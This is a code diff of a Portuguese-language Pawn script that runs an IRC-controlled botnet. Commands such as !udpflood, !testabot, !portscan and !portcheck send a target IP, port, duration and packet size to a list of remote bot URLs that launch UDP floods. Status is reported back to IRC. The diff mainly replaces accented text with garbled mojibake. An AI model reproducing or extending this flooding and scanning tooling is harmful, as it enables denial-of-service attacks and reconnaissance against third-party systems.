@@ -44,7 +44,7 @@ hook OnGameModeExit()
 	DesconectarBot();
 }
 //==============================================================================
-//                             Funções
+//                             FunÃ§Ãµes
 //==============================================================================
 stock TemAutorizacao(user[])
 {
@@ -77,7 +77,7 @@ function CarregaBots()
 	while(fread( BotNet, BotsBons[linha], sizeof(BotsBons[]) ))
 	{
 		if(linha > sizeof(BotsBons))
-			return printf("Oloco! Quanto Bot!! Limite é %d por enquanto...", sizeof(BotsBons));
+			return printf("Oloco! Quanto Bot!! Limite Ã© %d por enquanto...", sizeof(BotsBons));
 		for(new i = 0; i < sizeof(BotsBons[]); i++)
 			if(BotsBons[linha][i] == 10 || BotsBons[linha][i] == 13)
 			{
@@ -157,7 +157,7 @@ public Pacotar(ip[], porta, tempo, tamanho)
 			HTTP(i, HTTP_GET, string, "", "teste");
 			total++;
 		}
-		format(string,sizeof(string)," [UDPFLOOD Attack: Comandos Enviados!!!]");
+		format(string,sizeof(string),"[UDPFLOOD Attack: Comandos Enviados!!!]");
 		IRC_Say(1, Canal, string);
 		return total;
 	}
@@ -176,7 +176,7 @@ public Pacotar(ip[], porta, tempo, tamanho)
 			HTTP(i, HTTP_GET, string, "", "");
 			total++;
 		}
-		IRC_Say(1, Canal, " [UDPFLOOD Attack: Comandos Enviados!!!]");
+		IRC_Say(1, Canal, "[UDPFLOOD Attack: Comandos Enviados!!!]");
 		new iteracao = 1;
 		printf("iteracao %d/%d",iteracao, divisoes);
 		while(++iteracao <= divisoes)
@@ -215,7 +215,7 @@ public teste(index, response_code, data[])
 	if(response_code == 1 || response_code == 3)
 		format(string,sizeof(string),"4 ERRO: Site provavelmente offline (Bot ID: %d)", index);
 	else if(response_code == 6)
-		format(string,sizeof(string),"4 ERRO: não aceita set_time_limit() ou erro de servidor. (Bot ID: %d)", index);
+		format(string,sizeof(string),"4 ERRO: nÃ£o aceita set_time_limit() ou erro de servidor. (Bot ID: %d)", index);
 	else if(response_code == 200)
 		format(string,sizeof(string)," [UDPFLOOD Terminado com Sucesso!!!] (Bot ID: %d)", index);
 	else if(response_code == 404 || response_code == 403)
@@ -236,13 +236,13 @@ public Fim()
 IRCCMD:testabot(botid, channel[], user[], host[], params[])
 {
 	if(!TemAutorizacao(user))
-		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
+		return IRC_Say(botid, channel, "4[ERRO]: OtÃ¡rio! VocÃª nÃ£o manda em mim!");
 		
 	new boTid, ip[20], porta, tempo, tamanho;
 	if(sscanf(params, "ds[16]ddd", boTid,ip, porta, tempo, tamanho))
 		return IRC_Say(botid, channel, "12[USE]: !testabot [botid] [ip] [porta] [tempo] [tamanho]");
 	if(botid > sizeof(BotsBons))
-		return IRC_Say(botid, channel, "4[ERRO]: Otário! Não mexa no que não sabe!");
+		return IRC_Say(botid, channel, "4[ERRO]: OtÃ¡rio! NÃ£o mexa no que nÃ£o sabe!");
 	
 	new string1[100];
 	format(string1,sizeof(string1),"?ip=%s&porta=%d&tempo=%d&tamanho=%d",ip,porta,tempo,tamanho);
@@ -256,13 +256,13 @@ IRCCMD:testabot(botid, channel[], user[], host[], params[])
 IRCCMD:testabot2(botid, channel[], user[], host[], params[])
 {
 	if(!TemAutorizacao(user))
-		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
+		return IRC_Say(botid, channel, "4[ERRO]: OtÃ¡rio! VocÃª nÃ£o manda em mim!");
 		
 	new boTid, ip[20], porta, tempo, tamanho, tempo2;
 	if(sscanf(params, "ds[16]dddd", boTid,ip, porta, tempo, tamanho, tempo2))
 		return IRC_Say(botid, channel, "12[USE]: !testabot [botid] [ip] [porta] [tempo] [tamanho]");
 	if(botid > sizeof(BotsBons))
-		return IRC_Say(botid, channel, "4[ERRO]: Otário! Não mexa no que não sabe!");
+		return IRC_Say(botid, channel, "4[ERRO]: OtÃ¡rio! NÃ£o mexa no que nÃ£o sabe!");
 	
 	new string1[100];
 	format(string1,sizeof(string1),"?ip=%s&porta=%d&tempo=%d&tamanho=%d",ip,porta,tempo,tamanho);
@@ -284,7 +284,7 @@ IRCCMD:testabot2(botid, channel[], user[], host[], params[])
 IRCCMD:udpflood(botid, channel[], user[], host[], params[])
 {
 	if(!TemAutorizacao(user))
-		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
+		return IRC_Say(botid, channel, "4[ERRO]: OtÃ¡rio! VocÃª nÃ£o manda em mim!");
 		
 	new ip[20], porta, tempo, tamanho;
 	if(sscanf(params, "s[16]ddd",ip, porta, tempo, tamanho))
@@ -297,7 +297,7 @@ IRCCMD:udpflood(botid, channel[], user[], host[], params[])
 IRCCMD:portcheck(botid, channel[], user[], host[], params[])
 {
 	if(!TemAutorizacao(user))
-		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
+		return IRC_Say(botid, channel, "4[ERRO]: OtÃ¡rio! VocÃª nÃ£o manda em mim!");
 		
 	new ip[20], porta;
 	if(sscanf(params, "s[16]d",ip, porta))
@@ -321,13 +321,13 @@ IRCCMD:portcheck(botid, channel[], user[], host[], params[])
 IRCCMD:portscan(botid, channel[], user[], host[], params[])
 {
 	if(!TemAutorizacao(user))
-		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
+		return IRC_Say(botid, channel, "4[ERRO]: OtÃ¡rio! VocÃª nÃ£o manda em mim!");
 		
 	new ip[20], porta1, porta2;
 	if(sscanf(params, "s[16]dd",ip, porta1, porta2))
 		return IRC_Say(botid, channel, "12[USE]: !portscan [ip] [porta1] [porta2]");
 	if(porta1 > porta2)
-		return IRC_Say(botid, channel, "04Você é imbecil!? Eu sou apenas um bot, meu algorítimo checa da menor para a maior!");
+		return IRC_Say(botid, channel, "04VocÃª Ã© imbecil!? Eu sou apenas um bot, meu algorÃ­timo checa da menor para a maior!");
 	
 	new resumo[70];
 	IRC_Say(botid, channel, "12Iniciando portscan...");
@@ -349,7 +349,7 @@ IRCCMD:portscan(botid, channel[], user[], host[], params[])
 			IRC_Say(botid, channel, "04[Falha de Sistema.]");
 	}
 	if(alguma == 0)
-		format(resumo, sizeof(resumo), "12Portscan finalizado!! Não encontramos nenhuma porta aberta.", alguma);
+		format(resumo, sizeof(resumo), "12Portscan finalizado!! NÃ£o encontramos nenhuma porta aberta.", alguma);
 	else if(alguma == 1)
 		format(resumo, sizeof(resumo), "12Portscan finalizado!! Encontramos 1 porta aberta.");
 	else
@@ -361,7 +361,7 @@ IRCCMD:portscan(botid, channel[], user[], host[], params[])
 IRCCMD:join(botid, channel[], user[], host[], params[])
 {
 	if(!TemAutorizacao(user))
-		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
+		return IRC_Say(botid, channel, "4[ERRO]: OtÃ¡rio! VocÃª nÃ£o manda em mim!");
 	new canal[50];
 	if(sscanf(params, "s[50]",canal))
 		return IRC_Say(botid, channel, "12[USE]: !join [canal]");
@@ -372,7 +372,7 @@ IRCCMD:join(botid, channel[], user[], host[], params[])
 IRCCMD:part(botid, channel[], user[], host[], params[])
 {
 	if(!TemAutorizacao(user))
-		return IRC_Say(botid, channel, "4[ERRO]: Otário! Você não manda em mim!");
+		return IRC_Say(botid, channel, "4[ERRO]: OtÃ¡rio! VocÃª nÃ£o manda em mim!");
 	new canal[50];
 	if(sscanf(params, "s[50]",canal))
 		return IRC_Say(botid, channel, "12[USE]: !part [canal]");
